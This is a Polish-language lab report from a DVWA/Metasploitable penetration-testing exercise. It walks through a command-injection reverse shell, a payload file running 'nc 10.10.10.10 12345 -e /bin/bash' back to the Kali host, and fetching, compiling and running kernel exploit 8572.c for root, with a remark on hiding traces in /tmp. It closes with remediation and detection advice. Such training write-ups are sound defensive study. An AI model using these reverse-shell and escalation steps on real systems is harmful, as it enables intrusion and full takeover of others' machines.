# 🛡️ DVWA – Command Execution & Privilege Escalation

> Dokumentacja laboratoryjna z testów penetracyjnych na środowisku DVWA.

---

## 🖥️ Konfiguracja środowiska

| Maszyna | Adres IP |
|---------|----------|
| **Metasploitable** | `10.10.10.5` |
| **Kali Linux** | `10.10.10.10` |

---

## Zadanie 1A – Reverse Shell przez Command Execution

**Cel:** Wykorzystując podatność *Command Execution* wykonać połączenie przy użyciu netcat tak, aby uzyskać reverse shell na uprawnieniach `www-data` z serwera DVWA na konsolę Kali. Na końcu opisz swoje działania oraz jak wyeliminować taką podatność, jak wykryć i zablokować taki atak.

### Kroki

**1. Nasłuchiwanie na Kali (Terminal):**

```bash
nc -lvp 31337
```

Po wykonaniu polecenia Ping z poziomu DVWA uzyskaliśmy połączenie.

---

## Zadanie 1B – Eskalacja Uprawnień (Privilege Escalation)

**Cel:** Wykonaj wszystkie poniższe działania i opisz je. Napisz też jakie podatności zostały wykorzystane, jak je wyeliminować oraz jak wykryć i zablokować taki atak.

### Krok 1 – Rekonesans systemu

Po uzyskaniu shell'a zbieramy informacje o systemie operacyjnym, wersji, nazwie kodowej i kernelu.

### Krok 2 – Wyszukanie exploita

Szukamy odpowiedniego exploita dla zidentyfikowanego kernela:

```
Linux Kernel 2.6 (Gentoo / Ubuntu 8.10)
Ścieżka: exploits/linux/local/8572.c
```

Podgląd zawartości exploita na Kali:

```bash
less /usr/share/exploitdb/exploits/linux/local/8572.c
# wyjście: q
```

### Krok 3 – Przygotowanie infrastruktury (Terminal Kali)

Uruchamiamy Apache i tworzymy link symboliczny, aby udostępnić exploit ofierze:

```bash
sudo service apache2 restart
sudo ln -s /usr/share/exploitdb/exploits/linux/local/ /var/www/html/
```

### Krok 4 – Tworzenie payload'u

Tworzymy plik uruchomieniowy `run`:

```bash
sudo gedit /var/www/html/run
```

Zawartość pliku `run`:

```bash
#!/bin/bash
nc 10.10.10.10 12345 -e /bin/bash
```

### Krok 5 – Przejście do katalogu `/tmp` i pobranie plików

Z uzyskanego wcześniej shell'a na niskich uprawnieniach:

```bash
cd /tmp
```

> **Dlaczego `/tmp`?**
>
> Wybór katalogu `/tmp` podczas przeprowadzania ataku nie jest przypadkowy:
>
> - **Uprawnienia do zapisu** – Katalog `/tmp` jest jednym z niewielu miejsc w systemie Linux, do których każdy użytkownik — w tym `www-data` o niskich uprawnieniach — ma pełne prawo zapisu i wykonywania plików.
> - **Miejsce na exploity** – Eskalacja uprawnień wymaga pobrania kodu źródłowego (np. `8572.c`) i jego skompilowania. Ponieważ jako `www-data` nie masz dostępu do folderów domowych innych użytkowników ani katalogów systemowych, `/tmp` jest idealnym „placem zabaw".
> - **Dyskrecja i porządek** – Pliki w tym katalogu są często ignorowane przez administratorów, a wiele systemów automatycznie czyści jego zawartość przy restarcie, co pomaga zacierać ślady po zakończonym ataku.

### Krok 6 – Kompilacja exploita

Na atakowanej maszynie (w shell'u na niskich uprawnieniach):

```bash
gcc -o exploit 8572.c
```

### Krok 7 – Uruchomienie exploita

Szukamy PID procesu `udevd`. Szukany PID to jedyny niezerowy PID — **jeden mniejszy niż PID procesu `udevd`** odpalonego na root.

Przykład: jeśli `udevd` działa jako PID `2815`, to:

```bash
./exploit 2814
```

Na Terminalu 2 (nasłuchiwanie) uzyskujemy shell z podwyższonymi uprawnieniami. ✅

---

## ⚠️ Podatności i zalecenia

| Podatność | Opis | Zalecenie |
|-----------|------|-----------|
| **Command Injection** | Brak walidacji danych wejściowych w formularzu DVWA | Filtrowanie i escapowanie danych, whitelist dozwolonych znaków |
| **Stary kernel Linux** | Kernel 2.6 podatny na lokalną eskalację uprawnień | Aktualizacja systemu operacyjnego i kernela |
| **Niebezpieczna konfiguracja `www-data`** | Serwer WWW z możliwością wykonywania poleceń systemowych | Zasada najmniejszych uprawnień (least privilege) |

---

## 🔍 Jak wykryć i zablokować taki atak?

- **IDS/IPS** (np. Snort, Suricata) – wykrycie ruchu `netcat` i nieautoryzowanych połączeń wychodzących
- **Monitoring logów** – analiza `/var/log/apache2/` i logów systemowych pod kątem podejrzanych poleceń
- **Web Application Firewall (WAF)** – blokowanie payloadów Command Injection
- **Aktualizacje** – regularne łatanie kernela i oprogramowania serwera
- **Ograniczenie ruchu wychodzącego** – firewall blokujący nieautoryzowane połączenia z serwera WWW na zewnątrz
